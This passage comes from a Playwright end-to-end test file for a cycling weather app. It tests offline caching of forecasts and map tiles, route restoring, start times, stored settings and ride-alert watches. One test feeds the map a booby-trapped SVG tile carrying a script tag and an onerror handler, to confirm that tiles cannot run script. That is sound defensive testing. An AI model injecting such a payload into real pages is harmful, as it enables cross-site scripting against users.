    localStorage.setItem('cw_weather_probe', JSON.stringify({ data: { probe: 1 }, timestamp: Date.now() - 100 * 60000 }));
    const rec = window.cw.utils.createRecorder();
    return { data: window.cw.utils.getCache('cw_weather_probe', rec), age: rec.staleAgeMs, offline: rec.offline };
  });
  expect(read.data).toEqual({ probe: 1 });
  expect(read.offline).toBe(true);
  expect(read.age).toBeGreaterThanOrEqual(100 * 60000);
  expect(read.age).toBeLessThan(101 * 60000);
});

test('the app reopens on the last route, with no network', async ({ page }) => {
  const control = { celsius: 18, offline: false };
  await installNativeBridge(page);
  await stubProvider(page, control);

  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect(routeName(page)).toContainText('Masnou');
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);

  // Out of coverage, cold start, nobody touches the file picker.
  await ageTheCache(page, 90);
  control.offline = true;
  await page.addInitScript(() =>
    Object.defineProperty(navigator, 'onLine', { get: () => false, configurable: true })
  );
  await page.reload();
  await mapReady(page);

  await expect(routeName(page)).toContainText('Masnou');
  await expect(trackDrawn(page)).not.toHaveCount(0);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await expect(page.locator('.notice')).toContainText('1 h 30 min');
});

test('a first run without coverage says so', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.addInitScript(() =>
    Object.defineProperty(navigator, 'onLine', { get: () => false, configurable: true })
  );

  // Nothing stored and nothing reachable: the screen would otherwise stay blank.
  await page.goto('/index.html');
  await mapReady(page);

  await expect(page.locator('.notice')).toContainText(/needs coverage|necesita cobertura/, {
    timeout: 15000,
  });
});

// The restore asks for its route before waiting for recent routes, so a route picked in
// that wait replaces it. Finding nothing stored, it used to say so all the same, over the
// notice of the request that replaced it.
test('a first-run restore that a newer request replaced says nothing about coverage', async ({ page }) => {
  await recordNotices(page);
  await installNativeBridge(page);
  await goOffline(page);
  await page.addInitScript(() =>
    Object.defineProperty(navigator, 'onLine', { get: () => false, configurable: true })
  );
  await page.goto('/index.html');
  await mapReady(page);
  // Nothing else asks for a route at this start-up: the restore has asked, and is waiting.
  await expect.poll(() => page.evaluate(() => window.cw.hasRouteRequests())).toBe(true);

  await pickText(page, 'broken.gpx', 'this is not a route');
  await expect(page.locator('#horizonNotice')).toHaveText(loadFailedNotice);
  await page.waitForTimeout(6000);   // past the restore's five-second wait
  expect((await page.evaluate(() => window.__notices)).filter((n) => /needs coverage|necesita cobertura/.test(n))).toEqual([]);
  await expect(page.locator('#horizonNotice')).toHaveText(loadFailedNotice);
});

test('a first run with coverage stays quiet', async ({ page }) => {
  await installNativeBridge(page);
  await stubProvider(page, { celsius: 18, offline: false });

  await page.goto('/index.html');
  await mapReady(page);
  await page.waitForTimeout(7000);   // past the point the offline notice would appear

  await expect(page.locator('.notice')).not.toContainText(/needs coverage|necesita cobertura/);
});

test('the blank map says why, and only when it is blank', async ({ page }) => {
  await installNativeBridge(page);
  await stubProvider(page, { celsius: 18, offline: false });

  // With a connection the tiles load, so there is nothing to explain.
  await page.goto('/index.html');
  await mapReady(page);
  await expect(page.locator('#cwMapOffline')).toBeHidden();

  // Out of coverage the background cannot load and a bare grey rectangle reads as
  // a failure. It must be labelled, and without covering the route.
  await page.addInitScript(() =>
    Object.defineProperty(navigator, 'onLine', { get: () => false, configurable: true })
  );
  await page.reload();
  await mapReady(page);

  const badge = page.locator('#cwMapOffline');
  await expect(badge).toBeVisible();

  const { badgeBox, mapBox } = await page.evaluate(() => ({
    badgeBox: document.getElementById('cwMapOffline').getBoundingClientRect().toJSON(),
    mapBox: document.getElementById('map').getBoundingClientRect().toJSON(),
  }));
  // Out of the middle of the map, where the track is drawn.
  expect(badgeBox.top).toBeGreaterThan(mapBox.top + mapBox.height * 0.6);
});

/** Tiles a server would send, with the cross-origin header the cache depends on. */
async function stubTiles(page, control) {
  await page.route(
    (url) => url.hostname.endsWith('tile.openstreetmap.org'),
    (route) =>
      control.offline
        ? route.abort()
        : route.fulfill({
            status: 200,
            contentType: 'image/svg+xml',
            headers: { 'Access-Control-Allow-Origin': '*', 'Cache-Control': 'public, max-age=604800' },
            body: '<svg xmlns="http://www.w3.org/2000/svg" width="256" height="256"><rect width="256" height="256" fill="#e8e0d8"/></svg>',
          })
  );
}

const tilesDrawn = (page) => page.locator('#map img.leaflet-tile-loaded');

test('map tiles already seen survive losing coverage', async ({ page }) => {
  const control = { celsius: 18, offline: false };
  await installNativeBridge(page);
  await stubProvider(page, control);
  await stubTiles(page, control);

  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect(tilesDrawn(page)).not.toHaveCount(0);
  await expect
    .poll(async () => (await page.evaluate(() => window.cwTileCacheStats())).tiles)
    .toBeGreaterThan(0);

  // Out of coverage, cold start: the route restores and the background comes back
  // from what was stored, so the map is not a blank rectangle.
  control.offline = true;
  await page.addInitScript(() =>
    Object.defineProperty(navigator, 'onLine', { get: () => false, configurable: true })
  );
  await page.reload();
  await mapReady(page);
  await expect(routeName(page)).toContainText('Masnou');
  await expect(tilesDrawn(page)).not.toHaveCount(0);

  // And with a background there is nothing to apologise for.
  await expect(page.locator('#cwMapOffline')).toBeHidden();
});

test('the website keeps the plain tile layer', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  // No Capacitor, so no caching layer: the map behaves exactly as it always did.
  expect(await page.evaluate(() => !!(window.cwTileLayer && window.cwTileLayer.createTile
    && window.cwTileLayer.createTile !== window.L.TileLayer.prototype.createTile))).toBe(false);
});

test('the tile cache stays bounded across sessions', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  // Seed more tiles than the cap, as many sessions of riding would. Writing them
  // directly is the point: a session that views only a handful of tiles must still
  // end up trimming what earlier sessions left behind.
  await page.evaluate(async () => {
    const db = await new Promise((res) => {
      const r = indexedDB.open('cw_tiles', 1);
      r.onsuccess = (e) => res(e.target.result);
    });
    const store = db.transaction('tiles', 'readwrite').objectStore('tiles');
    for (let i = 0; i < 1400; i++) {
      store.put({ url: `https://x/${i}.png`, blob: new Blob(['t']), ts: 1000 + i });
    }
    await new Promise((res) => { store.transaction.oncomplete = res; });
    db.close();
  });
  expect((await page.evaluate(() => window.cwTileCacheStats())).tiles).toBe(1400);

  await page.reload();
  await mapReady(page);

  await expect
    .poll(async () => (await page.evaluate(() => window.cwTileCacheStats())).tiles, { timeout: 15000 })
    .toBeLessThanOrEqual(1000);

  // The oldest went first, so the tiles most recently looked at are the survivors.
  const survivors = await page.evaluate(async () => {
    const db = await new Promise((res) => {
      const r = indexedDB.open('cw_tiles', 1);
      r.onsuccess = (e) => res(e.target.result);
    });
    return new Promise((res) => {
      const q = db.transaction('tiles', 'readonly').objectStore('tiles').getAll();
      q.onsuccess = () => res(q.result.map((r) => r.ts));
    });
  });
  expect(Math.min(...survivors)).toBeGreaterThan(1000);
});

// Private browsing, blocked site data, a full disk. Caching is then impossible and
// the app must behave as it always did. Deliberately says nothing about the badge:
// whether the background survives depends on the web view's own HTTP cache, which
// was observed doing it sometimes and not others, and that is not ours to assert.
test('the map still works when storage is unavailable', async ({ page }) => {
  const control = { celsius: 18, offline: false };
  await installNativeBridge(page);
  await stubProvider(page, control);
  await stubTiles(page, control);

  // Private browsing, blocked site data, a full disk: opening the database throws.
  // Caching is then impossible, but the map must behave exactly as it always did.
  await page.addInitScript(() => {
    window.indexedDB = {
      open() { throw new Error('IndexedDB is disabled'); },
    };
  });

  const crashes = [];
  page.on('pageerror', (e) => crashes.push(e.message));

  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);

  await expect(tilesDrawn(page)).not.toHaveCount(0);
  await expect(routeName(page)).toContainText('Masnou');

  // The dangerous combination: no network either, so every tile has to go through
  // the cache lookup that cannot work. Tiles must settle as errors rather than hang
  // forever waiting on a promise nobody resolves.
  control.offline = true;
  await page.addInitScript(() =>
    Object.defineProperty(navigator, 'onLine', { get: () => false, configurable: true })
  );
  await page.reload();
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);

  await expect(routeName(page)).toContainText('Masnou');
  await expect(trackDrawn(page)).not.toHaveCount(0);
  expect(crashes).toEqual([]);
});

test('the settings panel still fits across the screen', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#toggleConfig').click();
  await page.waitForTimeout(400);

  // This used to check every keyboard field was at least 16px, the trick for stopping
  // iOS zooming in on focus. The viewport does that now (see the page-zoom test), and
  // the sizes went back to the website's. What is still worth pinning is the thing
  // raising them broke: the panel overflowing sideways.
  expect(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth)).toBe(true);
  await expect(page.locator('#apiKeyOW')).toBeVisible();
});

/* ---------- the start time (spec §4.8) ---------- */

const startField = (page) => page.locator('#datetimeRoute');
const shownTimes = (page) =>
  page.evaluate(() => [...document.querySelectorAll('#weatherTable .time-cell')].map((c) => c.textContent.trim()));
/** Sets the start field the way the picker does, with its change event. */
const chooseStart = (page, local) =>
  page.evaluate((v) => {
    const el = document.getElementById('datetimeRoute');
    el.value = v;
    el.dispatchEvent(new Event('change', { bubbles: true }));
  }, local);

test('a start time chosen ahead is saved, and a reload without touching anything else keeps it', async ({ page }) => {
  await page.clock.install({ time: new Date('2026-09-20T08:07:00') });
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await chooseStart(page, '2026-09-22T10:00');
  await page.reload();
  await mapReady(page);
  await page.waitForTimeout(300);
  await expect(startField(page)).toHaveValue('2026-09-22T10:00');
});

test('a start time saved in the past comes back as now, rounded up to the quarter hour', async ({ page }) => {
  await page.clock.install({ time: new Date('2026-09-20T08:07:00') });
  await page.addInitScript(() => localStorage.setItem('cwSettings', JSON.stringify({ datetimeRoute: '2026-09-20T06:00' })));
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await page.waitForTimeout(300);
  await expect(startField(page)).toHaveValue('2026-09-20T08:15');
});

// An app is resumed, not reloaded: coming back hours later used to leave the table of a departure
// already gone, and only say so.
test('coming back to the app after the start has passed moves it to now, and the table follows', async ({ page }) => {
  await startClock(page, Date.parse('2026-09-20T08:00:00'));
  await installNativeBridge(page);
  await stubProvider(page, { celsius: 18, offline: false });
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await expect(startField(page)).toHaveValue('2026-09-20T08:00');
  expect((await shownTimes(page))[0]).toContain('08:00');

  // Twenty minutes in a pocket: the start has passed, while the forecast on screen is not yet
  // old enough to be computed again for its age alone.
  await page.clock.fastForward('20:00');
  await page.evaluate(() => window.__appListeners.appStateChange({ isActive: true }));

  await expect(startField(page)).toHaveValue('2026-09-20T08:30');
  await expect.poll(async () => (await shownTimes(page))[0]).toContain('08:30');
});

test('coming back with the start still ahead computes nothing until the forecast is half an hour old', async ({ page }) => {
  await page.clock.install({ time: new Date('2026-09-20T08:00:00') });
  await installNativeBridge(page);
  await stubProvider(page, { celsius: 18, offline: false });
  await page.goto('/index.html');
  await mapReady(page);
  await chooseStart(page, '2026-09-20T12:00');
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await countLaunches(page);

  await page.clock.fastForward('10:00');
  await page.evaluate(() => window.__appListeners.appStateChange({ isActive: true }));
  await page.waitForTimeout(500);
  expect((await page.evaluate(() => window.__launches)).launch, 'a recent forecast was computed again').toBe(0);
  await expect(startField(page)).toHaveValue('2026-09-20T12:00');

  await page.clock.fastForward('25:00');
  await page.evaluate(() => window.__appListeners.appStateChange({ isActive: true }));
  await expect.poll(async () => (await page.evaluate(() => window.__launches)).launch).toBe(1);
  await expect(startField(page)).toHaveValue('2026-09-20T12:00');
});

// Computing again without coverage would read the cache under keys the new start has moved, and
// replace a table with data by an empty one.
test('coming back without coverage and nothing prepared, after the start has passed, keeps the table and says it cannot compute', async ({ page }) => {
  const control = { celsius: 18, offline: false };
  await startClock(page, Date.parse('2026-09-20T08:00:00'));
  await installNativeBridge(page);
  await stubProvider(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  const temps = await shownTemperatures(page);

  control.offline = true;
  await noLongerOnline(page);
  await page.clock.fastForward('20:00');
  await resume(page);

  await expect(startField(page)).toHaveValue('2026-09-20T08:30');
  await page.waitForTimeout(800);
  expect(await shownTemperatures(page)).toEqual(temps);
  await expect(page.locator('.notice')).toContainText(/cannot be computed again|no se puede recalcular/);
});

test('coming back while the latest forecast is still being computed, with the start unchanged, launches nothing more', async ({ page }) => {
  const control = { now: T0 };
  await startClock(page);
  await installNativeBridge(page);
  await stubAround(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  await chooseStart(page, localAt(T0 + 4 * 3600000));
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);

  const held = heldPromise();
  control.held = held.promise;
  await forgetForecasts(page);
  await countLaunches(page);
  await setSpeed(page, 13);
  await expect.poll(async () => (await page.evaluate(() => window.__launches)).launch).toBe(1);
  // The forecast on screen is old enough to be computed again, but its replacement is on its way.
  await page.clock.fastForward('35:00');
  await resume(page);
  await page.waitForTimeout(500);
  expect((await page.evaluate(() => window.__launches)).launch, 'a computation still running was launched again').toBe(1);
  held.release();
  await expect.poll(() => page.evaluate(() => window.cw.currentSnapshot()?.settings.speed)).toBe(13);
});

test('a booby-trapped map tile cannot run script', async ({ page }) => {
  // Tiles are the one new path from the network into the DOM: fetched, stored, and
  // rendered through an object URL. An <img> does not execute script in an SVG, and
  // this pins that down for the cached path as well as the live one.
  const evil = `<svg xmlns="http://www.w3.org/2000/svg" width="256" height="256">
    <rect width="256" height="256" fill="#e8e0d8"/>
    <script type="text/javascript">window.top.__tilePwned = 1;<\/script>
    <image href="x" onerror="window.top.__tilePwned = 2"/>
  </svg>`;

  await installNativeBridge(page);
  await stubProvider(page, { celsius: 18, offline: true });
  await page.route((url) => url.hostname.endsWith('tile.openstreetmap.org'), (route) =>
    route.fulfill({
      status: 200,
      contentType: 'image/svg+xml',
      headers: { 'Access-Control-Allow-Origin': '*' },
      body: evil,
    })
  );

  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect
    .poll(async () => (await page.evaluate(() => window.cwTileCacheStats())).tiles)
    .toBeGreaterThan(0);
  expect(await page.evaluate(() => window.__tilePwned)).toBeUndefined();

  // Again once it comes back from storage rather than the network.
  await page.reload();
  await mapReady(page);
  await page.waitForTimeout(1500);
  expect(await page.evaluate(() => window.__tilePwned)).toBeUndefined();
});

test('settings survive the web view losing its storage', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);

  await page.goto('/index.html');
  await mapReady(page);

  // Change something the user would notice losing, and save it the way the app does.
  await page.evaluate(() => {
    document.getElementById('windUnits').value = 'mph';
    document.getElementById('apiKeyOW').value = 'KEY-TO-KEEP';
    window.saveSettings();
  });
  await expect
    .poll(() => page.evaluate(() => window.__prefsRead().cwSettings))
    .toBeTruthy();

  // iOS reclaims WebKit storage: localStorage is gone, native storage is not.
  await page.evaluate(() => localStorage.clear());
  await page.reload();
  await mapReady(page);

  await expect.poll(() => page.evaluate(() => document.getElementById('windUnits').value)).toBe('mph');
  expect(await page.evaluate(() => document.getElementById('apiKeyOW').value)).toBe('KEY-TO-KEEP');
});

test('the web view keeps priority while it still has the settings', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.addInitScript(() => {
    // A stale native copy from an older session must not overwrite what is in use.
    sessionStorage.setItem('__prefs', JSON.stringify({
      cwSettings: JSON.stringify({ windUnits: 'kmh', apiKeyOW: 'OLD-KEY' }),
    }));
  });

  await page.goto('/index.html');
  await mapReady(page);
  await page.evaluate(() => {
    document.getElementById('apiKeyOW').value = 'CURRENT-KEY';
    window.saveSettings();
  });
  await page.reload();
  await mapReady(page);

  await expect.poll(() => page.evaluate(() => document.getElementById('apiKeyOW').value)).toBe('CURRENT-KEY');
});

test('settings restored from device storage after a forecast was computed compute it again with them', async ({ page }) => {
  await installNativeBridge(page);
  await stubProvider(page, { celsius: 18 });
  // The web view came up empty and the native copy answers only after the route has its forecast.
  await page.addInitScript(() => {
    sessionStorage.setItem('__prefs', JSON.stringify({ cwSettings: JSON.stringify({ cyclingSpeed: '20' }) }));
    window.__prefsHeld = new Promise((r) => { window.__releasePrefs = r; });
  });
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(() => page.evaluate(() => window.cw.currentSnapshot()?.settings.speed)).toBe(12);

  await page.evaluate(() => window.__releasePrefs());
  await expect.poll(() => page.evaluate(() => document.getElementById('cyclingSpeed').value)).toBe('20');
  await expect.poll(() => page.evaluate(() => window.cw.currentSnapshot()?.settings.speed)).toBe(20);
});

/* ---------- opening where the phone is ---------- */

const mapCentre = (page) =>
  page.evaluate(() => {
    const c = window.map.getCenter();
    return { lat: c.lat, lng: c.lng };
  });

// Madrid: far from both the website's Barcelona default and the fixture's route.
test.describe('with the phone in Madrid', () => {
  test.use({ geolocation: { latitude: 40.4168, longitude: -3.7038 }, permissions: ['geolocation'] });

  test('an empty map opens where the phone is, not on the website default', async ({ page }) => {
    await installNativeBridge(page);
    await goOffline(page);
    await page.goto('/index.html');
    await mapReady(page);

    await expect.poll(async () => (await mapCentre(page)).lng).toBeLessThan(-3);
    const c = await mapCentre(page);
    expect(Math.abs(c.lat - 40.4168)).toBeLessThan(0.05);
  });

  test('a route that arrived at start keeps the map; the position does not move it', async ({ page }) => {
    const gpx = await readFile(FIXTURE, 'utf8');
    await installNativeBridge(page, { routes: [{ gpx, name: 'shared.gpx' }] });
    await goOffline(page);
    await page.goto('/index.html');
    await mapReady(page);
    await expect(trackDrawn(page)).not.toHaveCount(0, { timeout: 15000 });

    // Long enough for a position to have been applied if it was going to be.
    await page.waitForTimeout(1500);
    const c = await mapCentre(page);
    expect(Math.abs(c.lat - 41.478)).toBeLessThan(0.05);
    expect(Math.abs(c.lng - 2.31)).toBeLessThan(0.05);
  });
});


/* ---------- ride alerts ---------- */

const savedWatches = (page) =>
  page.evaluate(() => window.__runnerEvents.filter((e) => e.event === 'saveWatch').map((e) => e.details.watch));

async function loadRouteAndForecast(page) {
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
}

test('computing a forecast arms the background watch with the route and a baseline', async ({ page }) => {
  await installNativeBridge(page);
  await stubProvider(page, { celsius: 20, watch: { rain: 0, wind: 8, gust: 12 } });
  await loadRouteAndForecast(page);

  await expect.poll(async () => (await savedWatches(page)).length).toBeGreaterThan(0);
  const watches = await savedWatches(page);
  const watch = watches[watches.length - 1];
  expect(watch).not.toBeNull();
  expect(watch.name).toBe('route.gpx');
  expect(watch.points.length).toBeGreaterThan(1);
  expect(watch.points.length).toBeLessThanOrEqual(12);
  expect(watch.end).toBeGreaterThan(Date.now());
  expect(watch.points[0]).toEqual(expect.objectContaining({ t: expect.any(Number), label: expect.stringMatching(/^\d\d:\d\d$/) }));
  // Seeded from the same request the runner will make, not from the table.
  expect(watch.baseline).toHaveLength(watch.points.length);
  expect(watch.baseline[0]).toEqual({ rain: 0, wind: 8, gust: 12 });
  expect(watch.owKey).toBe('');
  expect(await page.evaluate(() => window.__notifAsked)).toBe(true);
  expect(await page.evaluate(() => window.__runnerEvents.every((e) => e.label === 'cc.meteoride.app.watch'))).toBe(true);
  await expect(page.locator('#rideAlertsStatus')).toContainText('route.gpx');
});

test('the toggle clears the watch, stops new ones, and re-arms when switched back on', async ({ page }) => {
  await installNativeBridge(page);
  await stubProvider(page, { celsius: 20 });
  await loadRouteAndForecast(page);
  await expect.poll(async () => (await savedWatches(page)).length).toBeGreaterThan(0);
  const armed = (await savedWatches(page)).length;

  await page.evaluate(() => {
    const el = document.getElementById('rideAlerts');
    el.checked = false;
    el.dispatchEvent(new Event('change', { bubbles: true }));
  });
  await expect.poll(async () => (await savedWatches(page)).slice(-1)[0]).toBeNull();
  await expect(page.locator('#rideAlertsStatus')).toHaveText('');
  expect(JSON.parse(await page.evaluate(() => localStorage.getItem('cwSettings'))).rideAlerts).toBe(false);

  // Another forecast while off must not arm anything.
  await page.evaluate(() => document.dispatchEvent(new CustomEvent('cw:forecast', { detail: { steps: window.weatherData } })));
  await page.waitForTimeout(500);
  const afterOff = await savedWatches(page);
  expect(afterOff.length).toBe(armed + 1);

  await page.evaluate(() => {
    const el = document.getElementById('rideAlerts');
    el.checked = true;
    el.dispatchEvent(new Event('change', { bubbles: true }));
  });
  await expect.poll(async () => (await savedWatches(page)).slice(-1)[0]).not.toBeNull();
});

test('when notifications are refused the toggle switches itself off and says so', async ({ page }) => {
  await installNativeBridge(page, { notifications: 'denied' });
  await stubProvider(page, { celsius: 20 });
  await recordNotices(page);
  await loadRouteAndForecast(page);

  await expect(page.locator('#rideAlerts')).not.toBeChecked();
  await expect.poll(() => page.evaluate(() => window.__notices.join(' | '))).toContain('Notifications are off');
  expect(JSON.parse(await page.evaluate(() => localStorage.getItem('cwSettings'))).rideAlerts).toBe(false);
  const watches = await savedWatches(page);
  expect(watches.filter((w) => w !== null)).toHaveLength(0);
});

test('a watch stored by an earlier session is shown at start-up; the toggle is app-only', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.addInitScript(() => {
    sessionStorage.setItem('__watch', JSON.stringify({
      name: 'sunday.gpx', lang: 'en', start: Date.now() + 3600000, end: Date.now() + 7200000, points: [], notified: [],
    }));
  });
  await page.goto('/index.html');
  await mapReady(page);
  // The settings panel is closed, so check the row itself rather than visibility.
  await expect.poll(() => page.evaluate(() => document.getElementById('rideAlertsRow').hidden)).toBe(false);
  await expect(page.locator('#rideAlertsStatus')).toContainText('sunday.gpx');
});

test('on the website the ride-alerts toggle is not shown, even with the panel open', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#toggleConfig').click();
  await expect(page.locator('#showWeatherAlerts')).toBeVisible();   // the panel really is open
  await page.waitForTimeout(500);
  await expect(page.locator('#rideAlertsRow')).toBeHidden();
});

test('in the app the toggle sits in the open panel', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#toggleConfig').click();
  await expect(page.locator('#rideAlerts')).toBeVisible();
  await expect(page.locator('#rideAlerts')).toBeChecked();
});

test('when the OS will not run background tasks, the toggle says so', async ({ page }) => {
  await installNativeBridge(page, { background: 'denied' });
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await expect(page.locator('#rideAlertsHint')).toContainText('Background App Refresh');

  // And stays quiet when it will.
  await installNativeBridge(page, { background: 'available' });
  await page.reload();
  await mapReady(page);
  await page.waitForTimeout(500);
  expect(await page.evaluate(() => document.getElementById('rideAlertsHint').hidden)).toBe(true);
});

/* ---------- ride alerts: arming from the snapshot, in a queue ---------- */

/** Open-Meteo for the table and for the ride watch's baseline, each held while its promise is set. */
async function stubWatchProviders(page, control) {
  control.baselineAsked = 0;
  await page.route((url) => url.hostname === 'api.open-meteo.com', async (route) => {
    const url = new URL(route.request().url());
    const baseline = url.searchParams.get('timeformat') === 'unixtime';
    if (baseline) { control.baselineAsked++; if (control.baselineHeld) await control.baselineHeld; }
    else if (control.forecastHeld) await control.forecastHeld;
    const body = baseline ? watchForecast(url, control.watch) : forecastAt(20);
    return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(body) });
  });
  await page.route((url) => url.hostname.endsWith('tile.openstreetmap.org'), (r) => r.abort());
}
const heldPromise = () => { let release; const promise = new Promise((r) => { release = r; }); return { promise, release }; };
const storedWatches = (page) => page.evaluate(() => window.__runnerStored || []);
const lastStored = async (page) => (await storedWatches(page)).slice(-1)[0];
const armedWatches = async (page) => (await storedWatches(page)).filter((w) => w !== null);
/** Pretends the runner has already notified a warning, and read a baseline of its own. Also
 *  empties the picker, which fires no change for the same file picked twice in a row. */
const markStoredWatch = (page) =>
  page.evaluate(() => {
    document.getElementById('gpxFile').value = '';
    const w = JSON.parse(sessionStorage.getItem('__watch'));
    w.notified = ['AEMET_Viento_1_2'];
    w.baseline = w.points.map(() => ({ rain: 9, wind: 99, gust: 99 }));
    sessionStorage.setItem('__watch', JSON.stringify(w));
  });

for (const answer of ['granted', 'denied']) {
  test(`notification permission ${answer} after another route was confirmed stores nothing and leaves the toggle`, async ({ page }) => {
    await installNativeBridge(page, { notifications: answer });
    await recordNotices(page);
    const control = {};
    await stubWatchProviders(page, control);
    await page.addInitScript(() => { window.__permissionHeld = new Promise((r) => { window.__grantPermission = r; }); });
    await page.goto('/index.html');
    await mapReady(page);
    await page.locator('#gpxFile').setInputFiles(FIXTURE);
    await expect.poll(() => page.evaluate(() => window.__notifAsked)).toBe(true);

    // Another route is confirmed while the system dialog is open; its forecast has not published.
    control.forecastHeld = heldPromise().promise;
    await pickText(page, 'b.gpx', routeAt('Ruta B', 40.42));
    await expect(routeName(page)).toHaveText('Ruta B');
    await page.evaluate(() => window.__grantPermission());
    await page.waitForTimeout(800);

    expect(await armedWatches(page)).toEqual([]);
    await expect(page.locator('#rideAlerts')).toBeChecked();
    expect((await page.evaluate(() => window.__notices)).filter((n) => /Notifications are off/.test(n))).toEqual([]);
  });
}

test('a baseline that answers after another route was confirmed stores nothing', async ({ page }) => {
  await installNativeBridge(page);
  const control = { baselineHeld: heldPromise() };
  const baseline = control.baselineHeld;
  control.baselineHeld = baseline.promise;
  await stubWatchProviders(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(() => control.baselineAsked).toBeGreaterThan(0);

  control.forecastHeld = heldPromise().promise;
  await pickText(page, 'b.gpx', routeAt('Ruta B', 40.42));
  await expect(routeName(page)).toHaveText('Ruta B');
  control.baselineHeld = null;
  baseline.release();
  await page.waitForTimeout(800);
  expect(await armedWatches(page)).toEqual([]);
});

test('a save the runner answers late cannot land after the disarm that followed it', async ({ page }) => {
  await installNativeBridge(page);
  await stubWatchProviders(page, {});
  await page.goto('/index.html');
  await mapReady(page);
  await page.evaluate(() => { window.__runnerHoldNext = new Promise((r) => { window.__answerSave = r; }); });
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  // The save has reached the runner, which has not answered it yet.
  await expect.poll(() => page.evaluate(() => window.__runnerEvents.some((e) => e.event === 'saveWatch' && e.details.watch))).toBe(true);

  await page.evaluate(() => {
    const el = document.getElementById('rideAlerts');
    el.checked = false;
    el.dispatchEvent(new Event('change', { bubbles: true }));
  });
  await page.waitForTimeout(300);
  await page.evaluate(() => window.__answerSave());
  await expect.poll(() => page.evaluate(() => (window.__runnerStored || []).length)).toBe(2);
  expect(await lastStored(page)).toBeNull();
  expect(await page.evaluate(() => sessionStorage.getItem('__watch'))).toBe('null');
});

test('arming the same route again keeps what was already notified, and the baseline of the same points', async ({ page }) => {
  await installNativeBridge(page);
  await stubWatchProviders(page, { watch: { rain: 0, wind: 8, gust: 12 } });
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await armedWatches(page)).length).toBe(1);
  await markStoredWatch(page);

  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await armedWatches(page)).length).toBe(2);
  const watch = await lastStored(page);
  expect(watch.notified).toEqual(['AEMET_Viento_1_2']);
  expect(watch.baseline[0]).toEqual({ rain: 9, wind: 99, gust: 99 });
});

test('a new speed for the same route and start keeps what was notified and reads the baseline again', async ({ page }) => {
  await installNativeBridge(page);
  await stubWatchProviders(page, { watch: { rain: 0, wind: 8, gust: 12 } });
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await armedWatches(page)).length).toBe(1);
  const before = await lastStored(page);
  await markStoredWatch(page);

  await setSpeed(page, 20);
  await expect.poll(async () => (await armedWatches(page)).length).toBe(2);
  const watch = await lastStored(page);
  expect(watch.start).toBe(before.start);
  expect(watch.points.map((p) => p.t)).not.toEqual(before.points.map((p) => p.t));
  expect(watch.notified).toEqual(['AEMET_Viento_1_2']);
  expect(watch.baseline).toHaveLength(watch.points.length);
  expect(watch.baseline[0]).toEqual({ rain: 0, wind: 8, gust: 12 });
});

test('confirming another route disarms the watch; confirming the same route does not', async ({ page }) => {
  await installNativeBridge(page);
  const control = {};
  await stubWatchProviders(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await armedWatches(page)).length).toBe(1);
  control.forecastHeld = heldPromise().promise;

  await countLaunches(page);
  await page.evaluate(() => { document.getElementById('gpxFile').value = ''; });
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(() => page.evaluate(() => window.__launches.launch)).toBe(1);
  await page.waitForTimeout(300);
  expect(await lastStored(page)).not.toBeNull();

  await pickText(page, 'b.gpx', routeAt('Ruta B', 40.42));
  await expect(routeName(page)).toHaveText('Ruta B');
  await expect.poll(() => lastStored(page)).toBeNull();
